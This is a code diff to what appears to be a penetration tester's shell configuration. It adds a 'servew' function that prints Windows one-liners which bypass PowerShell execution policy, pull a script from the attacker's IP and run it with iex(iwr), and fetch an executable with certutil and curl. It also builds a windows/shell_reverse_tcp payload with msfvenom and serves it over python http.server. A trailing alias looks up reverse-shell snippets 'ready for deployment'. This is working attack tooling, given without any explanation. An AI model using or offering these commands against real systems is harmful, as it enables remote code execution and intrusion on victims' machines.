@@ -86,6 +86,20 @@ function serve() {
     fi
 }
 
+function servew() {
+    if [[ $# -eq 0 ]]; then
+        echo "cd c:\windows\tasks\ && powershell -ep bypass && iex(iwr -uri $myip:8000/transfer_files.ps1 -usebasicparsing)"
+        python -m http.server;
+    elif [[ $# -eq 1 ]]; then
+        echo "cd c:\windows\tasks\ && powershell -ep bypass && iex(iwr -uri $myip:$1/transfer_files.ps1 -usebasicparsing)"
+        python -m http.server $1
+    elif [[ $# -eq 2 ]]; then
+        echo "cd c:\windows\tasks\ && powershell -ep bypass && iex(iwr -uri $myip:$1/transfer_files.ps1 -usebasicparsing) && certutil.exe -f -urlcache -split http://$myip:$1/shell$2.exe shell$2.exe && curl $myip:$1/shell$2.exe -o c:\windows\tasks\shell$2.exe"
+        msfvenom -p windows/shell_reverse_tcp -f exe LHOST=$myip LPORT=$2 -o shell$2.exe
+        python -m http.server $1
+    fi
+}
+
 # Reverse shell snippets ready for deployment
 alias revshells='cat /opt/tools/reverse-shells.txt | grep'
 
